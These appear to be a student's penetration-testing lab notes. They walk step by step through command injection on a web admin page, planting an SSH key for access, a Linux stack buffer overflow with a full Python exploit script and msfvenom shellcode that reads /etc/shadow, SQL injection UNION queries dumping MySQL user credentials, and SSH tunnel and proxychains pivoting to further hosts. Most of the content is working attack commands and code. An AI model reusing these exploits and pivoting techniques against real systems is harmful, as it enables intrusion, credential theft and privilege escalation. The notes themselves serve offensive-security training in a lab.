
11 	RAAL-201-M 	4trgX9NlRIUq 	10.50.13.184
ports : 22,53,80 /login.php, /login.html, /img/, /scripts/     no robots


# initial enum
we did our nmap scripts and jotted down things of interest 
```
nmap --script=http-enum 10.50.13.184
```
things we made note of include the following 

ports : 22,53,80 /login.php, /login.html, /img/, /scripts/     no robots

# web access
 first we went to the web browser from firefox at the ip through there http port 

```
10.50.50.13.184:80
```
# gathered any public info on the page that might be useful 
```
/letterfromcea.pdf
CEO: Charlie Chaplann 
email: CChaplann@UniversalExports.com, PublicAffairs@TargetCorp.com
address: Suite 112, 1607 Range Rd Tampa, FL 33601
```
# exolored the page to see what could possibly be exploited either now '!!' or in the future after more intel is gathered '??'
```
Mal uploud?? getcareers.php?myfile=Executive_Assistant.html 
              /getcareers.php?myfile=Systems_engineer.html


command injection!!  http://10.50.13.184/admin.php?cmd=%3B+ls

```
  # Used the Command injection section to do some enumerating and possible ssh key upload. 
```
;ls - lisha
```
```
;whoami
```
```
;cd sw ; ls -lisha ; cat .htacess         
```
the commands above got me my current user, and i managed to find a file detailing some of their network configurations. 
```
525036 4.0K -rw-rw-rw- 1 root root   52 Mar  5  2025 .htaccess
order deny,allow
deny from all
allow from 127.0.0.1
```
# now that we have briefly enumarated, lets try to upload our key. 
the first step to uploading our key is generating it on our atkr station, in this case, our lin ops  
```
ssh-keygen -t rsa -b 4096
```
press enter, when prompted to overide, overwrite it and click enter a few more times to isure it has no passphrase associated with it

output should atleast contain this;
```
(empty for no passphrase):

The key's randomart image is:
+---[RSA 4096]----+
|E                |
|Xo.      .       |
|o*  .   o o      |
|  +. o o o o     |
| . .+ . S +      |
|. .o . + + o     |
|.+..o = + +      |
|o.++oo * . o     |
|.oo*=o. + .      |
+----[SHA256]-----+

```
now we want to prep our target for the injection

on the web browser we are exploiting, input the following command. this will make a directory for us to save our key too
```
;mkdir /var/www/.ssh
```
you can run the following command to insure that our directory was made
```
;ls -lisha /var/www 
```
# we have finished prepping our target, now lets prepare the injection,

   we do this by going back onto our atkr box, in this cae our linops, and cating they key we made earlier
```
cat /home/student/.ssh/id_rsa.pub 
```

we are going to copy this key and paste it into the vulnurable web browser
```
;echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCtr5tVsjgKS1lgHwkiV0aA/MddPCyb7yKuAZoHDE0/3CnKI4c++e/jYach2DpDdUySoJgfgypLlNlDP3kA0bK7D/ogATaBqnp6+jb2nDFXNHhymmtMDrMlbFx56/5Lba3tuLGFpldYt7gBi0nsPnxABzwE6e3RV9lc6WxsKzTikKh5d/cAc0l+DH+18LwqPcvEj6Lj5b4pK3+LpZBcUkaf3/T1ur5rDH1UMehmi2ppa/LM2t2dyvGB765XEPfFXd5mPXPRxcV45e/z3LELdOmtcu8WJv1yoRPITd+YdDt9seSCIK/sl82NGIKJSTmYVlzyte4exyaLDraTUzHxywPkf2Hog+qRKaicuO53BHMwat8mE9iwERcYs5wUc194Pb6q7/aq7gaYo7vzDf8xVeCLYpMpSUFf67VwNjRgUmTKxCNhpgvy7UywFuZl70NbdgiFeVtS5xDvzDRese7HJ+3NYbuqMpGdA/Jc7rRUaoNUhocoF0CXYiLWhyEmcJjRVSaBmhARUk5bvTDId2Mkyh2ZEkAOS71rT5l/EGsj1SWB3B1ak8/4Tjd8H2JCYJP/faGmgw9cBTd6cg8LezskcP5Uc5ZVLT968JjxdbjCLbvMB1uUrI9c7h17AY82ivNybwXJ3a79wsEI/y7tquE4m97HPmzp1QhlTDfMe2x/SVNb3Q== student@lin-ops" >> /var/www/.ssh/authorized_keys

```
we than double check to make sure that command went through correctly by cat our keys on the vulnurable web server 
```
;cat /var/www/.ssh/authorized_keys
```
# exploit 
no we go back into our atkr box, in this case our lin-ops and try to ssh using thekey we uploaded onto our target in our
```
ssh -i .ssh/id_rsa -MS /tmp/t1 www-data@10.50.13.184
```

# New box enumaration 

Once i successfuly got onto the box, i poked around and saw that they had AN EXECUTABLE called exploit me in their temp directory, i ran strings and realized it 

I copied this file over to my device using 
```
 scp -i .ssh/id_rsa www-data@10.50.13.184:/var/tmp/exploit_me .
```

# LINUX BUFFER OVERFLOW 



##static analysis- view code
check the file type
```
file <executable>               
```
look at the actual code 
```
strings <>    
```
check permissions
```
ls -lisa <executable> 
```


## behavioral- as intended

make it executable
```
chmod +x <executable>  
```
run the command
```
./<executable>     
```

## Dynamic analysis- not as intended

1. command substitution (used for passing parameters)
```
$(echo "1234") or `echo "1234"
```
   1.5 simulate user input into a file
```
         <file> <<<$(echo "1234")
```

## step 1
> linops 
```
 gdb
```
>gdb 
```
 shell
```
>linops(shell)
```
 env - gdb inventory.exe
```
>gdb
```
    unset env LINES
   ```
>gdb
  ```
    unset env COLUMNS
   ```
>gdb
```
    run #press ctrl c immediately
   ```
if this run command is closing out the executable instantly, you have to use start in order to step through one piece at a time
```
start
```
```
   gdb > info proc map
   ```
if you dont see the heap in the output, that means you arent far along the executable yet, you can use the step command in gdb to go to the next area in memory. and run info proc map again after. repeeat this until you see the heap
```
step
```

   # this is where the find command comes in, first from below the heap (start) and the last from the stack (last)
```
   find /b (first after the heap),(LAST OF THE STACK),0xff,0xe4
```
# this gets is our eip address that we convert to LITTLE ENDIAN, which goes into our script as the EIP VALUE

converting to little endian   
```
  0xf7de3b59   turns into   \x59\x3b\xde\xf7"
```


than we did 'quit' to get back to our shell

than we did 'exit' to get back to our initial gdb shell

# gdp-peda
```
unset env LINES
```
```
unset env COLUMNS
```
```   
file inventory.exe 
```
before running this next command insure your script contains what is listed below
```
run <<<$(python linbuff.py)
```
or this if you are running into not running error
```
run `python linbuf.py`
```
## at this point linbuff should contain the following, insure you comment out the same values as me throught ALL steps  
```
#!/usr/bin/env python

offset = "A" * 500

#eip = "\x59\x3b\xde\xf7"



print(offset)
```             

# Building our script 
to test your script do this in your gdp-peda session

 one you insure you have enough charecters to overwrite the eip go and get a string from wiremask with the same amount of charecters. 

 than copy and paste that string into your script in place of the ' "A" * 500 '

 these are the updates to script, comment out old values
```
#offset = "A" * 500 
offset = " this is where you put that long ass string we found but it would take up too much space" 
```
## now we want to rerun the script from our gdb-peda session 
```
run <<<$(python linbuff.py)
```
## now copy the hex value of the EIP and put that into the Register value section of wiremask. wiremask will now tell you the exect value to make your offset of "A"s

  now make the change to our script, comment out old values and make sure you do "+=" on the second offset
```
#offset = "A" * 500 
#offset = " this is where you put that long ass string we found but it would take up too much space"
offset = "A" *76
offset += "BBBB"
```
## now we want to rerun the script from our gdb-peda session
   
   we are looking to see that the "BBBB" is next to our EIP this will insure that we have the correct offset
```
run <<<$(python linbuff.py)
```
## now that we are sure our offset is correct, we can put our actual EIP that we discovered from our find comand earlier. Make sure you turned it into little endian 
```
#offset = "A" * 500 
#offset = " this is where you put that long ass string we found but it would take up too much space"
offset = "A" *76
#offset += "BBBB"
eip += "\x59\x3b\xde\xf7"  
```

# next is the msfvenom command
from a different linops term  
```
msfvenom -p linux/x86/exec CMD="cat /etc/shadow" -b "\x00\xfe\x20\x0a\xff" -f python
```
this gets us our buf values, INCLUDE THE EMPTY BUF VALUE, AND THE QUOTE AT THE END
   
paste the buf into the script

add your NOP sled to the script 

# below should be matching with your final script, PRINT ORDER MATTERS 
  ```
#!/usr/bin/env python




#offset = "A" * 500

#offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"

offset = "A" * 76
#offset += "BBBB"

eip = "\x59\x3b\xde\xf7"
nop = "\x90" * 76

buf =  b""
buf += b"\xdb\xcb\xba\x9a\x67\x1b\x7a\xd9\x74\x24\xf4\x58"
buf += b"\x2b\xc9\xb1\x0d\x31\x50\x1a\x03\x50\x1a\x83\xc0"
buf += b"\x04\xe2\x6f\x0d\x10\x22\x16\x80\x40\xba\x05\x46"
buf += b"\x04\xdd\x3d\xa7\x65\x4a\xbd\xdf\xa6\xe8\xd4\x71"
buf += b"\x30\x0f\x74\x66\x52\xd0\x78\x76\x30\xb1\x0c\x56"
buf += b"\x99\x54\x98\xf5\xca\xe5\x08\x9b\x70\x65\xbf\x5b"
buf += b"\x2e\x2a\xb6\xbd\x1d\x4c"

print(offset+eip+nop+buf)


```

   # try the final script on your own box to insure the script is working  and than we will move on to putting the script on our target 
```
./inventory.exe <<<$(python ~/Desktop/linbuff.py)
```

   # navigate to .111 through your tunnels 
   
   # either scp or copy and paste your script onto our target, in this case i copy and pasted it

   # !!we have to find the EIP of this device, so we are going to run the gdb commands on our target

```
gdb > shell
   
   linops (shell) > env - gdb /.hidden/inventory.exe
   
   gdb > unset env LINES
   
   gdb > unset env COLUMNS
   
   gdb > run #press ctrl c immediately
   
   gdb > info proc map
```
# this is where we do the find command again( almost there )  
```
find /b (first after the heap),(LAST OF THE STACK),0xff,0xe4
```
# this gets is our eip address that we convert to LITTLE ENDIAN, which goes into our script as the EIP VALUE

converting to little endian and place it where the other eip was 
```
  0xf7de3b59   turns into   \x59\x3b\xde\xf7"
```
 put this new eip in place of the old one in your script 

   # run the script on the target device, run this from a shell not from gdb
```
    ./inventory.exe <<<$(python ~/Desktop/linbuff.py)
```
  
   
   # use sudo !! to run the script as an elevated user
```
sudo !!
```

# enumaration
 i continued to navigate throgh the box and decided to go after neighboring boxes to see what other targets I can get
```
ip a
```
this box only has neighbors that i can not exploit becasuse of my ROE's 
```
cat /etc/hosts
```
this command gave me another box to look into (192.168.28.175

I wanted to learn more abour this box so I used my MS to my T1 and put a proxychains on it. 

```
ssh -S /tmp/t1 t1 -O forward -D 9050
```
once i had my proxychains set, I ran my scans and set up my prt forward to the new hosts http port
```
proxychains nmap --script=http-enum 192.168.28.175
```
```
ssh -S /tmp/t1 t1 -O forward -L 21100:192.168.28.175:8000
```
this gives me a browser that is vulnurable to the get method 

# step 1
 first we want to find what field is vulnurabled 

 what we are looking for is for the result to be a table of all available selections in our case it was 7
 ```
 product=<slection> OR 1=1 
 ```
once we found our vulnurable selection, we want to find the amount of columns we are working with bygradually increasing the number line next to the UNION SELECT command until you get an output. in our case we had 3 
```
product=7 UNION SELECT 1,2,3 
```
next we can run our golden statement 
```
<URL>/Uniondemo.php?selection=2 UNION SELECT Table_schema,Column_name,table_name FROM Information_schema.columns     (table_name and COlumn_name are swapped due to eorginized columns above
```
scroll down the results until you seed man made inputs that seem suspicouse 
```
mysql 	user 	$Password
mysql 	user 	$Select_priv
mysql 	user 	$Insert_priv
mysql 	user 	$Update_priv
mysql 	user 	$Delete_priv
```
now we can use these fields to create a costume search
```
                                                         column,column,column FROM Database.Table
            <URL>/Uniondemo.php?selection=2 UNION SELECT Host,User,Password FROM mysql.user
```
you can use the info you find, in our case we found ROT13 encrypted credentials 
```
HAM 	32 	$15
1 	nccyrObggbzW3na$ 	$Aaron              appleBottomJ3an$
2 	GhexrlQnl24 	$user2                  TurkeyDay24
3 	Obo4GURCva3nccyrf 	$user3            Bob4THEPin3apples
4 	Lroth 	$Lee_Roth
4 	nabgurecnffjbeq4GURntrf 	$Lroth      anotherpassword4THEages
```
i tried this credentials to get onto the .175 box that we were already on  but it didnt work. so i decided do a for loop to scan all ips in this network. 

!! if you r commands are not working in this shell, try dropping into a bash shell and rerunning the commands

```
for i in {1..255}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
```
this gave me a new box, i noticed that we could ssh into it from our www-data box and i tried those credentials from above on there, and user3 worked

# moving on
```
ssh user3@192.168.28.165
```

# establishing our tunnels
 we already made our iniitial tunnel to the T1 box and we made our port forward to the , i am going to re paste it below to make it easier to visualize what we are doing. 

first tunnel to t1 (past command)
```
ssh -i .ssh/id_rsa -MS /tmp/t1 www-data@10.50.13.184
```
next we made a port forward from our t1 MS to The webrowser on T2 (past command)
```
ssh -S /tmp/t1 t1 -O forward -L 21100:192.168.28.175:8000
```
now we want to create a port forward to the ssh port we found on our T3(new command)
```
ssh -S /tmp/t1 t1 -O forward -L 21101:192.168.28.165:22
```
now we want a MS on our T3 box(new command)
```
ssh -p21101 -MS /tmp/t3 user3@127.0.0.1
```
now we want a proxychains on our T3 so we can do scanning on the next network
```
ssh -p21101 -S /tmp/t3 t3 -O forward -D 9050
```
now we want on port forward from the -MS on our t3 to the new target discovered 
```
ssh -p21101 -S /tmp/t3 t3 -O forward -L 21102:192.168.28.189:3389
```
now that we have a tunnel to 
```
proxychains xfreerdp /u:Aaron /p:appleBottomJ3an$ /v:192.168.28.189 /clipboard
```
our rdp didnt work so we made a tunnel to the ssh port on t4 [AC: Click on the rdp window as soon as it pops up] 
```
ssh -p21101 -S /tmp/t3 t3 -O forward -L 21103:192.168.28.189:22
```
now we make a master socket to our t4
```
ssh -p21103 -MS /tmp/t4 Aaron@127.0.0.1
```

next we made or port forward
# Miller notes

once on the target box id run the for /i script which listed ips on the range. with those id create a tunnel for my nmap scan ( nmap <IP> ) 
with the ports open id decide what to do with the box whether it was ssh or rdp or a webserver. if webserver i tunneled to the webserver port

with ssh id tunnel to that port or in the case of the dry run you didnt always need to tunnel and could do an ssh on an attack box

for rdp you have to tunnel to the rdp port 3389 and then run xfreedrp /u:<username> /p:<password> /v:<IP>
